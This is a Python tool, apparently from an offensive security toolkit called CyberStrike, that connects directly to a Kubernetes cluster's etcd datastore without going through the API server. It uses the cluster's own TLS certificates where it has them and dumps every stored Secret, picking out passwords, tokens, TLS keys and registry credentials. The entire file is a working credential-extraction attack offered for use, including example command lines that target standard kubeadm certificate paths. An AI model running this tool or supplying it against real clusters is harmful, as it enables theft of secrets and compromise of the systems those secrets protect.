#!/usr/bin/env python3
"""
etcd_dump.py — Direct etcd Secret Extraction

Connects directly to an etcd endpoint (bypassing the Kubernetes API server)
and extracts secrets stored under /registry/secrets/. Supports TLS client
certificates for authenticated etcd access. Parses Kubernetes Secret protobuf
format when possible, falls back to raw extraction.

Part of CyberStrike offensive security platform.
"""

import argparse
import base64
import json
import os
import re
import signal
import sys
import time
from datetime import datetime

try:
    import etcd3
except ImportError:
    print("ERROR: etcd3 required. Install: pip3 install etcd3", file=sys.stderr)
    sys.exit(1)


class EtcdDumper:
    def __init__(self, args):
        self.args = args
        self.event_count = 0
        self.start_time = None
        self.running = True
        self.etcd_client = None
        self.secrets_found = 0
        self.keys_extracted = 0

    def signal_handler(self, signum, frame):
        self.running = False

    def print_banner(self):
        print("=" * 70)
        print("CyberStrike — Direct etcd Secret Extraction")
        print("=" * 70)
        print(f"PID:        {os.getpid()}")
        print(f"Endpoint:   {self.args.endpoint}")
        print(f"TLS:        {'yes' if self.args.cert else 'no'}")
        print(f"Output:     {'JSON' if self.args.json_output else 'text'}")
        print(f"Started:    {datetime.now().isoformat()}")
        print("=" * 70)
        print()

    def emit(self, record):
        self.event_count += 1
        if self.args.json_output:
            print(json.dumps(record), flush=True)
        else:
            status = record.get("status", "info")
            print(f"[{record['timestamp']}] [{status.upper()}] "
                  f"{record.get('namespace', 'N/A')}/{record.get('secret_name', 'N/A')}", flush=True)
            if record.get("keys"):
                for key_info in record["keys"]:
                    key_name = key_info.get("key", "")
                    value = key_info.get("value", "")
                    redacted = value[:20] + "..." if len(value) > 20 else value
                    print(f"  {key_name}: {redacted}", flush=True)
            if record.get("error"):
                print(f"  error: {record['error']}", flush=True)

    def parse_endpoint(self):
        """Parse endpoint string into host and port."""
        endpoint = self.args.endpoint
        if "://" in endpoint:
            endpoint = endpoint.split("://")[1]
        if ":" in endpoint:
            parts = endpoint.rsplit(":", 1)
            return parts[0], int(parts[1])
        return endpoint, 2379

    def connect(self):
        """Establish connection to etcd."""
        host, port = self.parse_endpoint()

        kwargs = {
            "host": host,
            "port": port,
        }

        if self.args.cert and self.args.key:
            kwargs["cert_cert"] = self.args.cert
            kwargs["cert_key"] = self.args.key
        if self.args.ca:
            kwargs["ca_cert"] = self.args.ca

        try:
            self.etcd_client = etcd3.client(**kwargs)
            self.emit({
                "timestamp": datetime.now().isoformat(),
                "status": "connected",
                "details": f"Connected to etcd at {host}:{port}",
            })
            return True
        except Exception as e:
            self.emit({
                "timestamp": datetime.now().isoformat(),
                "status": "error",
                "error": f"Failed to connect to etcd: {e}",
            })
            return False

    def extract_string_fields(self, raw_bytes):
        """Extract printable string fields from raw bytes (protobuf or otherwise)."""
        fields = {}
        try:
            text = raw_bytes.decode("utf-8", errors="replace")
            return {"raw": text}
        except Exception:
            pass
        return fields

    def parse_k8s_secret(self, key_path, raw_value):
        """Parse a Kubernetes secret from etcd raw value."""
        parts = key_path.strip("/").split("/")
        namespace = parts[2] if len(parts) > 2 else "unknown"
        secret_name = parts[3] if len(parts) > 3 else "unknown"

        secret_keys = []
        try:
            decoded_str = raw_value.decode("utf-8", errors="replace")

            opaque_pattern = re.compile(r'([a-zA-Z0-9_.\-/]+)\x12[\x00-\xff]')
            potential_keys = re.findall(r'[\x20-\x7e]{2,64}', decoded_str)

            common_secret_keys = [
                "password", "secret", "token", "key", "cert", "username",
                "api_key", "apikey", "api-key", "access_key", "secret_key",
                "database_url", "db_password", "tls.crt", "tls.key", "ca.crt",
                ".dockerconfigjson", "credentials",
            ]

            for pk in potential_keys:
                pk_lower = pk.lower().strip()
                for csk in common_secret_keys:
                    if csk in pk_lower:
                        secret_keys.append({
                            "key": pk.strip(),
                            "value": "<extracted from protobuf>",
                        })
                        break

            if not secret_keys:
                chunk_size = min(len(decoded_str), 512)
                secret_keys.append({
                    "key": "_raw",
                    "value": decoded_str[:chunk_size],
                })

        except Exception:
            secret_keys.append({
                "key": "_binary",
                "value": base64.b64encode(raw_value[:256]).decode("ascii"),
            })

        return namespace, secret_name, secret_keys

    def dump_secrets(self):
        """Retrieve all secrets from etcd under /registry/secrets/."""
        prefix = "/registry/secrets/"

        try:
            results = self.etcd_client.get_prefix(prefix)
        except Exception as e:
            self.emit({
                "timestamp": datetime.now().isoformat(),
                "status": "error",
                "error": f"Failed to read etcd prefix {prefix}: {e}",
            })
            return

        for value, metadata in results:
            if not self.running:
                break

            key_path = metadata.key.decode("utf-8", errors="replace") if metadata.key else ""
            namespace, secret_name, secret_keys = self.parse_k8s_secret(key_path, value)

            self.secrets_found += 1
            self.keys_extracted += len(secret_keys)

            record = {
                "timestamp": datetime.now().isoformat(),
                "status": "extracted",
                "etcd_key": key_path,
                "namespace": namespace,
                "secret_name": secret_name,
                "keys": secret_keys,
                "version": metadata.version if metadata else None,
                "mod_revision": metadata.mod_revision if metadata else None,
            }

            if not self.args.json_output:
                for key_info in secret_keys:
                    if len(key_info.get("value", "")) > 20:
                        key_info["value"] = key_info["value"][:20] + "..."

            self.emit(record)

    def run(self):
        self.print_banner()

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        self.start_time = time.monotonic()

        if not self.connect():
            return

        self.dump_secrets()

        self.cleanup()

    def cleanup(self):
        if self.etcd_client:
            try:
                self.etcd_client.close()
            except Exception:
                pass

        print(f"\n--- etcd_dump summary ---")
        print(f"Secrets found: {self.secrets_found}")
        print(f"Keys extracted: {self.keys_extracted}")
        if self.start_time:
            print(f"Duration: {time.monotonic() - self.start_time:.1f}s")
        print("Done.")


def main():
    parser = argparse.ArgumentParser(
        description="Extract Kubernetes secrets directly from etcd.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 etcd_dump.py --endpoint https://10.0.0.1:2379 --cert /etc/kubernetes/pki/etcd/server.crt --key /etc/kubernetes/pki/etcd/server.key --ca /etc/kubernetes/pki/etcd/ca.crt\n"
            "  python3 etcd_dump.py --endpoint http://127.0.0.1:2379\n"
            "  python3 etcd_dump.py --endpoint https://etcd.local:2379 --json-output\n"
        ),
    )
    parser.add_argument("--endpoint", type=str, required=True,
                        help="etcd endpoint (e.g., https://10.0.0.1:2379)")
    parser.add_argument("--cert", type=str, default=None, help="Path to TLS client certificate")
    parser.add_argument("--key", type=str, default=None, help="Path to TLS client key")
    parser.add_argument("--ca", type=str, default=None, help="Path to CA certificate")
    parser.add_argument("--json-output", action="store_true", default=False, help="Output as JSON lines")
    args = parser.parse_args()

    dumper = EtcdDumper(args)
    dumper.run()


if __name__ == "__main__":
    main()
